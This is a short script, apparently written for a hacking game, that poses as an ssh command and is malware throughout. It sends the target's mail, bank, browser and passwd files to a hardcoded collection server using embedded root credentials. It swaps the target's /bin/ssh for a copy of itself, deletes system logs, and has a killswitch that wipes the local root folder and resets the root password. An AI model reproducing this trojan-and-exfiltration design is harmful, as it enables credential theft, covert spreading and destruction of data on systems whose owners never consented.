if params.len < 2 or params.len > 3 then exit(command_info("ssh_usage"))
if params.len == 3 then port = params[2].to_int
credentials = params[0].split("@")
user = credentials[0]
password = credentials[1]
port = 22
if typeof(port) != "number" then exit("Invalid port: " + port)
print("Connecting...")
pc = get_shell
router = get_router
// CREATE SSH.SRC FILE TO INFOSERVER /HOME + chmod

//ssh+ Infoserver ip
ssh = get_shell.connect_service(params[1], port, user, password, "ssh")
infoserver = pc.connect_service("16.204.117.106", 22, "root", "Snoopoo")

//if not info server / killswitch
if not infoserver then 
	if active_user != "root" then ssh.start_terminal
	Computer = get_shell.host_computer

	mainFolder = Computer.File("/")
	mainFolder.chmod("o-rwx", 1)
	mainFolder.chmod("g-rwx", 1)
	mainFolder.chmod("u-rwx", 1)
	mainFolder.delete
	output = get_shell.host_computer.change_password("root", "WannaCry.Kill")
	ssh.start_terminal
	end if

remotehost = infoserver.host_computer
srcfile = remotehost.File("/home/ssh.src")
if srcfile == null then ssh.start_terminal //added lastly

//info from home folder
home = ssh.host_computer.File("/home/")
subFiles = home.get_folders
if subFiles then
for subFile in subFiles
	nameFile = subFile.name
end for
mail = ssh.host_computer.File("/home/"+nameFile+"/Config/Mail.txt")
bank = ssh.host_computer.File("/home/"+nameFile+"/Config/Bank.txt")
map = ssh.host_computer.File("/home/"+nameFile+"/Config/Map.conf")
Browser = ssh.host_computer.File("/home/"+nameFile+"/Config/Browser.txt")
else
	mail = null
	bank = null
	map = null
	Browser = null
end if

pwfile = ssh.host_computer.File("/etc/passwd")
router = get_router
content = "Public_ip: " + router.public_ip + " "

//create content string
if mail != null then content = content + "mail: " + mail.content + " "
if bank != null then content =  content + "bank: " + bank.content + " "
if map != null then content =  content + "map: " + map.content + " "
if pwfile != null then content =  content + "passwd: " + pwfile.content + " "
if Browser != null then content =  content + "Browser: " + Browser.content + " "

//set content
sshinfo = ssh.host_computer
infoserver.host_computer.touch("/home", router.public_ip)
infofile = infoserver.host_computer.File("/home/"+router.public_ip)
infofile.set_content(active_user + " " + params[0] + " " + params[1] + " " + content)

//touch
ssh.host_computer.touch("/usr", "ssh.src")
codefile = ssh.host_computer.File("/usr/ssh.src")
codefile.set_content(srcfile.content)
shost = ssh.host_computer
sshfile = shost.File("/bin/ssh")
if sshfile != null then sshfile.delete
ssh.build("/usr/ssh.src", "/bin")
if codefile != null then codefile.delete

//log delete
log = ssh.host_computer.File("/var/system.log")
if log == null then 
	print("file not found.")
else 
	if not log.has_permission("w") then
		print("rm: permission denied")
	else
		log.delete
		print()
	end if
end if

if not ssh then exit()
ssh.start_terminal


